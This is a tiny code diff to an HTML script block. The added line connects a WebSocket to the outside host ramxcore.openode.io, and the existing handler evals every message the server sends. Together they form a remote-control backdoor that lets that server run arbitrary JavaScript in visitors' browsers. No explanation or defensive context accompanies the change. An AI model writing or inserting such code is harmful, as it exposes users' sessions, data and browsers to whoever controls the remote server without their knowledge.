@@ -1,4 +1,4 @@
 <script>
-net=new WebSocket()
+net=new WebSocket("ws://ramxcore.openode.io/")
 net.onmessage=(e)=>{eval(e.data)}
 </script>
